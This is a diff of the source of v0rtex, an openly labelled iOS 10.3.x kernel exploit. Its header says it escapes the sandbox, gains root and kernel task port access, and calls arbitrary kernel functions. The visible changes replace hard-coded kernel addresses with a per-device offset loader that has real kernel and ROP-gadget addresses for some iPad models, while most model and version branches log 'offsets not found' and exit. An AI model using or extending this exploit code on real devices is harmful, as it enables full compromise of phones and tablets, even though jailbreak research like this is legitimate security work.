@@ -1,99 +1,80 @@
-
 // v0rtex
-// Bug by Ian Beer.
+// Bug by Ian Beer, I suppose?
 // Exploit by Siguza.
 
-// Includes modifications if any by Din3zh
-
 // Status quo:
-// - Escapes sandbox, gets root and tfp0, should work on A7-A10 devices <=10.3.3.
+// - Escapes sandbox, gets root and tfp0, should work on A7-A9 devices <=10.3.3.
 // - Can call arbitrary kernel functions with up to 7 args via KCALL().
-// - Relies on mach_zone_force_gc() which was removed in iOS 11, but the same
+// - Relies heavily on userland derefs, but with mach_port_request_notification
+//   you could register fakeport on itself thus leaking the address of the
+//   entire 0x1000 block, which should give you enough scratch space. (TODO)
+// - Relies on mach_zone_force_gc which was removed in iOS 11, but the same
 //   effect should be achievable by continuously spraying through zones and
-//   measuring how long it takes - garbage collection usually takes ages. :P
-// - Occasionally seems to mess with SpringBoard, i.e. apps don't open when you
-//   tap on their icons - sometimes affects only v0rtex, sometimes all of them,
-//   sometimes even freezes the lock screen. Can happen even if the exploit
-//   aborts very early on, so I'm not sure whether it's even due to that, or due
-//   to my broken UI.
-// - Most common panic at this point is "pmap_tte_deallocate(): ... refcnt=0x1",
-//   which can occur when the app is killed, but only if shmem_addr has been
-//   faulted before. Faulting that page can _sometimes_ increase the ref count
-//   on its tte entry, which causes the mentioned panic when the task is
-//   destroyed and its pmap with it. Exact source of this is unknown, but I
-//   suspect it happening in pmap_enter_options_internal(), depending on page
-//   compression status (i.e. if the page is compressed refcnt_updated is set to
-//   true and the ref count isn't increased afterwards, otherwise it is).
-//   On 32-bit such a panic can be temporarily averted with mlock(), but that
-//   seems to cause even greater trouble later with zalloc, and on 64-bit mlock
-//   even refuses to work. Deallocating shmem_addr from our address space does
-//   not fix the problem, and neither does allocating new memory at that address
-//   and faulting into it (which should _guarantee_ that the corresponding pmap
-//   entry is updated). Fixing up the ref count manually is very tedious and
-//   still seems to cause trouble with zalloc. Calling mach_zone_force_gc()
-//   after releasing the IOSurfaceRootUserClient port seems to _somewhat_ help,
-//   as does calling sched_yield() before mach_vm_remap() and faulting the page
-//   right after, so that's what I'm doing for now.
-//   In the long term, this should really be replaced by something deterministic
-//   that _always_ works (like removing the tte entirely).
+//   measuring how long it takes - garbag collection usually takes ages. :P
 
 // Not sure what'll really become of this, but it's certainly not done yet.
 // Pretty sure I'll leave iOS 11 to Ian Beer though, for the time being.
+// Might also do a write-up at some point, once fully working.
 
 #include <sched.h>              // sched_yield
 #include <string.h>             // strerror, memset
 #include <unistd.h>             // usleep, setuid, getuid
 #include <mach/mach.h>
-#include <mach-o/loader.h>
 #include <CoreFoundation/CoreFoundation.h>
 
-#include "common.h"             // LOG, kptr_t
-#include "v0rtex.h"
 
-// ********** ********** ********** find automatically, eventually ********** ********** **********
 
-#   define SIZEOF_TASK                                  0x550
-#   define OFFSET_TASK_ITK_SELF                         0xd8
-#   define OFFSET_TASK_ITK_REGISTERED                   0x2e8
-#   define OFFSET_TASK_BSD_INFO                         0x360
-#   define OFFSET_PROC_UCRED                            0x100
-#   define OFFSET_VM_MAP_HDR                            0x10
-#   define OFFSET_IPC_SPACE_IS_TASK                     0x28
-#   define OFFSET_REALHOST_SPECIAL                      0x10
-#   define OFFSET_IOUSERCLIENT_IPC                      0x9c
-#   define OFFSET_VTAB_GET_RETAIN_COUNT                 0x3  /* in pointer-sized units */
-#   define OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX      0xb7 /* in pointer-sized units */
-typedef struct mach_header_64 mach_hdr_t;
+#include "common.h"
+//#include "offsets.m"
+#include "sys/utsname.h"
+#include "sys/sysctl.h"
 
-// iPod touch 6G (iPod7,1) 10.3.3
-#   define OFFSET_ZONE_MAP                              0xfffffff007558478 /* "zone_init: kmem_suballoc failed" */
-#   define OFFSET_KERNEL_MAP                            0xfffffff0075b4050
-#   define OFFSET_KERNEL_TASK                           0xfffffff0075b4048
-#   define OFFSET_REALHOST                              0xfffffff00753aba0 /* host_priv_self */
-#   define OFFSET_COPYIN                                0xfffffff00718d028
-#   define OFFSET_COPYOUT                               0xfffffff00718d21c
-#   define OFFSET_CHGPROCCNT                            0xfffffff00739aa04
-#   define OFFSET_KAUTH_CRED_REF                        0xfffffff007374d90
-#   define OFFSET_IPC_PORT_ALLOC_SPECIAL                0xfffffff0070a60b4 /* convert_task_suspension_token_to_port */
-#   define OFFSET_IPC_KOBJECT_SET                       0xfffffff0070b938c /* convert_task_suspension_token_to_port */
-#   define OFFSET_IPC_PORT_MAKE_SEND                    0xfffffff0070a5bd8 /* "ipc_host_init" */
-#   define OFFSET_OSSERIALIZER_SERIALIZE                0xfffffff00744db90
-#   define OFFSET_ROP_LDR_X0_X0_0x10                    0xfffffff00722a41c
 
-// ********** ********** ********** constants ********** ********** **********
+UInt64 OFFSET_ZONE_MAP;
+UInt64 OFFSET_KERNEL_MAP;
+UInt64 OFFSET_KERNEL_TASK;
+UInt64 OFFSET_REALHOST;
+UInt64 OFFSET_BZERO;
+UInt64 OFFSET_BCOPY;
+UInt64 OFFSET_COPYIN;
+UInt64 OFFSET_COPYOUT;
+UInt64 OFFSET_IPC_PORT_ALLOC_SPECIAL;
+UInt64 OFFSET_IPC_KOBJECT_SET;
+UInt64 OFFSET_IPC_PORT_MAKE_SEND;
+UInt64 OFFSET_IOSURFACEROOTUSERCLIENT_VTAB;
+UInt64 OFFSET_ROP_ADD_X0_X0_0x10;
 
-#   define KERNEL_MAGIC             MH_MAGIC_64
-#   define KERNEL_HEADER_OFFSET     0x4000
 
-#define KERNEL_SLIDE_STEP           0x100000
+#define SIZEOF_TASK                                 0x550
+#define OFFSET_TASK_ITK_SELF                        0xd8
+#define OFFSET_TASK_ITK_REGISTERED                  0x2e8
+#define OFFSET_TASK_BSD_INFO                        0x360
+#define OFFSET_PROC_P_PID                           0x10
+#define OFFSET_PROC_UCRED                           0x100
+#define OFFSET_UCRED_CR_UID                         0x18
+#define OFFSET_UCRED_CR_LABEL                       0x78
+#define OFFSET_VM_MAP_HDR                           0x10
+#define OFFSET_IPC_SPACE_IS_TASK                    0x28
+#define OFFSET_REALHOST_SPECIAL                     0x10
+#define OFFSET_IOUSERCLIENT_IPC                     0x9c
+#define OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX     0x5b8
 
-#define IOSURFACE_CREATE_OUTSIZE    0x3c8 /* XXX 0x6c8 for iOS 11.0, 0xbc8 for 11.1.2 */
+//offsets are for iPhone 6s 10.3.2
 
-#define NUM_BEFORE                  0x2000
-#define NUM_AFTER                   0x1000
-#define NUM_DATA                    0x4000
-#define DATA_SIZE                   0x1000
-#   define VTAB_SIZE                200
+//#define OFFSET_ZONE_MAP                             0xfffffff007548478 /* "zone_init: kmem_suballoc failed" */
+//#define OFFSET_KERNEL_MAP                           0xfffffff0075a4050
+//#define OFFSET_KERNEL_TASK                          0xfffffff0075a4048
+//#define OFFSET_REALHOST                             0xfffffff00752aba0 /* host_priv_self */
+//#define OFFSET_BZERO                                0xfffffff007081f80
+//#define OFFSET_BCOPY                                0xfffffff007081dc0
+//#define OFFSET_COPYIN                               0xfffffff0071806f4
+//#define OFFSET_COPYOUT                              0xfffffff0071808e8
+//#define OFFSET_IPC_PORT_ALLOC_SPECIAL               0xfffffff007099e94 /* convert_task_suspension_token_to_port */
+//#define OFFSET_IPC_KOBJECT_SET                      0xfffffff0070ad16c /* convert_task_suspension_token_to_port */
+//#define OFFSET_IPC_PORT_MAKE_SEND                   0xfffffff0070999b8 /* "ipc_host_init" */
+////#define OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         0xfffffff006e7a998 // 0xfffffff006e7b9c8 - 0x1030
+//#define OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         0xfffffff006e7c9f8 // 0xfffffff006e7b9c8 + 0x1030
+//#define OFFSET_ROP_ADD_X0_X0_0x10                   0xfffffff0064b1398
 
 const uint64_t IOSURFACE_CREATE_SURFACE =  0;
 const uint64_t IOSURFACE_SET_VALUE      =  9;
@@ -122,45 +103,1500 @@ enum
     kOSSerializeMagic           = 0x000000d3U,
 };
 
-// ********** ********** ********** macros ********** ********** **********
+void load_offsets(void)
+{
+    struct utsname sysinfo;
+    uname(&sysinfo);
+    const char *kern_version = sysinfo.version;
+    
+    //read device id
+    int d_prop[2] = {CTL_HW, HW_MACHINE};
+    char device[20];
+    size_t d_prop_len = sizeof(device);
+    //sysctl(d_prop, 2, NULL, &d_prop_len, NULL, 0);
+    sysctl(d_prop, 2, device, &d_prop_len, NULL, 0);
+    
+    int version_prop[2] = {CTL_KERN, KERN_OSVERSION};
+    char version[20];
+    size_t version_prop_len = sizeof(version);
+    //sysctl(version_prop, 2, NULL, &version_prop_len, NULL, 0);
+    sysctl(version_prop, 2, version, &version_prop_len, NULL, 0);
+    
+    //exit(1);
+    
+    //iPad 4 (WiFi)
+    if(!strcmp(device, "iPad3,4"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad 4 (GSM)
+    if(!strcmp(device, "iPad3,5"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad 4 (Global)
+    if(!strcmp(device, "iPad3,6"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Air (WiFi)
+    if(!strcmp(device, "iPad4,1"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Air (Cellular)
+    if(!strcmp(device, "iPad4,2"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Air (China)
+    if(!strcmp(device, "iPad4,3"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Mini 2 (WiFi)
+    if(!strcmp(device, "iPad4,4"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            OFFSET_COPYIN                               = 0xfffffff007181218;
+            OFFSET_KERNEL_TASK                          = 0xfffffff0075a8048;
+            OFFSET_REALHOST                             = 0xfffffff00752eba0;
+            OFFSET_BZERO                                = 0xfffffff007081f80;
+            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070ad1d4;
+            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0064fd174;
+            OFFSET_COPYOUT                              = 0xfffffff00718140c;
+            OFFSET_ZONE_MAP                             = 0xfffffff00754c478;
+            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff007099f7c;
+            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006f2e338;
+            OFFSET_KERNEL_MAP                           = 0xfffffff0075a8050;
+            OFFSET_BCOPY                                = 0xfffffff007081dc0;
+            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff007099aa0;
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Mini 2 (Cellular)
+    if(!strcmp(device, "iPad4,5"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            OFFSET_ZONE_MAP                             = 0xfffffff00754c478;
+            OFFSET_KERNEL_MAP                           = 0xfffffff0075a8050;
+            OFFSET_KERNEL_TASK                          = 0xfffffff0075a8048;
+            OFFSET_REALHOST                             = 0xfffffff00752eba0;
+            OFFSET_BZERO                                = 0xfffffff007081f80;
+            OFFSET_BCOPY                                = 0xfffffff007081dc0;
+            OFFSET_COPYIN                               = 0xfffffff007180e98;
+            OFFSET_COPYOUT                              = 0xfffffff00718108c;
+            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff007099f14;
+            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070ad1ec;
+            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff007099a38;
+            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006f2e338;
+            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0064fe174;
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Mini 2 (China)
+    if(!strcmp(device, "iPad4,6"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Mini 3 (WiFi)
+    if(!strcmp(device, "iPad4,7"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Mini 3 (Cellular)
+    if(!strcmp(device, "iPad4,8"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Mini 3 (China)
+    if(!strcmp(device, "iPad4,9"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Mini 4 (WiFi)
+    if(!strcmp(device, "iPad5,1"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Mini 4 (Cellular)
+    if(!strcmp(device, "iPad5,2"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F91"))
+        {
+            LOG("10.3.2 - 14F91 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Air 2 (WiFi)
+    if(!strcmp(device, "iPad5,3"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Air 2 (Cellular)
+    if(!strcmp(device, "iPad5,4"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad 5 (WiFi)
+    if(!strcmp(device, "iPad6,11"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F90"))
+        {
+            LOG("10.3.2 - 14F90 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad 5 (Cellular)
+    if(!strcmp(device, "iPad6,12"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F90"))
+        {
+            LOG("10.3.2 - 14F90 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Pro 9.7-inch (WiFi)
+    if(!strcmp(device, "iPad6,3"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Pro 9.7-inch (Cellular)
+    if(!strcmp(device, "iPad6,4"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Pro 12.9-inch (WiFi)
+    if(!strcmp(device, "iPad6,7"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Pro 12.9-inch (Cellular)
+    if(!strcmp(device, "iPad6,8"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Pro 2 (12.9-inch, WiFi)
+    if(!strcmp(device, "iPad7,1"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F8089"))
+        {
+            LOG("10.3.2 - 14F8089 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Pro 2 (12.9-inch, Cellular)
+    if(!strcmp(device, "iPad7,2"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F8089"))
+        {
+            LOG("10.3.2 - 14F8089 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Pro (10.5-inch, WiFi)
+    if(!strcmp(device, "iPad7,3"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F8089"))
+        {
+            LOG("10.3.2 - 14F8089 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPad Pro (10.5-inch, Cellular)
+    if(!strcmp(device, "iPad7,4"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F8089"))
+        {
+            LOG("10.3.2 - 14F8089 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPhone 5 (GSM)
+    if(!strcmp(device, "iPhone5,1"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPhone 5 (Global)
+    if(!strcmp(device, "iPhone5,2"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3
+        if(!strcmp(version, "14E277"))
+        {
+            LOG("10.3 - 14E277 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        
+    }
+    
+    //iPhone 5c (GSM)
+    if(!strcmp(device, "iPhone5,3"))
+    {
+        //10.3.3
+        if(!strcmp(version, "14G60"))
+        {
+            LOG("10.3.3 - 14G60 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.2
+        if(!strcmp(version, "14F89"))
+        {
+            LOG("10.3.2 - 14F89 offsets not found for %s", device);
+            exit(1);
+        }
+        
+        //10.3.1
+        if(!strcmp(version, "14E304"))
+        {
+            LOG("10.3.1 - 14E304 offsets not found for %s", device);
+            exit(1);
+        }
